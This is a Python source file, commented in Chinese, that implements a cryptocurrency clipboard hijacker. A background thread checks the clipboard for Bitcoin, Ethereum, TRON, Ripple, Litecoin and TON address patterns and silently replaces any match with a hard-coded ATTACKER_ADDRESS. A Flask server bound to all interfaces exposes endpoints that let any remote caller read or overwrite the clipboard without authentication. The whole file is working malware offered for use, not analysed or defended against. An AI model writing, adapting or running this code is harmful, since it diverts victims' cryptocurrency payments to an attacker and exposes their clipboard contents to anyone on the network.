from flask import Flask, request, jsonify
import pyperclip
import re
import time
import threading

# 替换的目标目标地址
ATTACKER_ADDRESS = "panteklu"


def is_crypto_address(address):
    """
    判断给定地址是否为加密货币地址。
    :param address: 剪贴板内容字符串
    :return: True 如果是加密货币地址，否则 False
    """
    if not isinstance(address, str):  # 如果内容不是字符串，直接返回 False
        return False

    # 加密货币地址规则（全面验证）
    patterns = {
        "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",  # 比特币（传统地址）
        "Bitcoin (SegWit)": r"^bc1[a-zA-HJ-NP-Z0-9]{6,87}$",       # 比特币（隔离见证）
        "Ethereum": r"^0x[a-fA-F0-9]{40}$",                       # 以太坊
        "TRON": r"^T[a-zA-Z0-9]{33}$",                            # TRON 加密链
        "Ripple": r"^r[a-zA-Z0-9]{23,43}$",                       # 瑞波币
        "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,35}$",        # 莱特币
        "TON (Workchain)": r"^UQ[a-zA-Z0-9-_]{43,66}$",           # TON（Workchain）
    }

    # 逐个正则规则匹配地址
    try:
        for regex in patterns.values():
            if re.match(regex, address):  # 检测是否匹配某种加密货币地址
                return True
        return False
    except Exception:
        return False  # 异常时返回 False


def monitor_clipboard():
    """
    监控剪贴板内容，并自动替换符合加密货币地址的内容。
    """
    previous_text = ""  # 用于记录之前剪贴板内容，避免重复处理
    while True:
        try:
            clipboard_content = pyperclip.paste()  # 从剪贴板获取内容
            # 如果剪贴板内容变化且是加密货币地址，则进行替换
            if clipboard_content != previous_text and is_crypto_address(clipboard_content):
                pyperclip.copy(ATTACKER_ADDRESS)  # 替换内容为目标地址
                print(f"替换结果: {clipboard_content} -> {ATTACKER_ADDRESS}")
                previous_text = ATTACKER_ADDRESS  # 更新记录的内容为目标地址
            else:
                previous_text = clipboard_content  # 保留原内容，避免重复替换

            time.sleep(0.5)  # 避免过于频繁监控，降低系统压力
        except Exception as e:
            print(f"监控出现异常: {str(e)}")
            time.sleep(1)  # 意外情况下减少监控频率


# Flask Web服务
app = Flask(__name__)

@app.route("/", methods=["GET", "HEAD"])
def home():
    """
    定义根路径以避免 404 错误。
    """
    return "Service is running", 200


@app.route('/get_clipboard', methods=['GET'])
def get_clipboard():
    """
    获取剪贴板内容（通过 Web API）。
    """
    try:
        clipboard_content = pyperclip.paste()  # 获取剪贴板当前内容
        return jsonify({"clipboard_content": clipboard_content}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/set_clipboard', methods=['POST'])
def set_clipboard():
    """
    设置剪贴板内容（通过 Web API）。
    """
    try:
        content = request.json.get("content")  # 从请求体获取用户提供的内容
        if content:
            pyperclip.copy(content)  # 设置新的剪贴板内容
            return jsonify({"message": "剪贴板内容设置成功！"}), 200
        else:
            return jsonify({"error": "未提供内容"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    # 使用线程运行剪贴板监控和 Web 服务
    threading.Thread(target=monitor_clipboard).start()  # 启动剪贴板监控线程
    app.run(host="0.0.0.0", port=5000)  # 启动 Web 服务
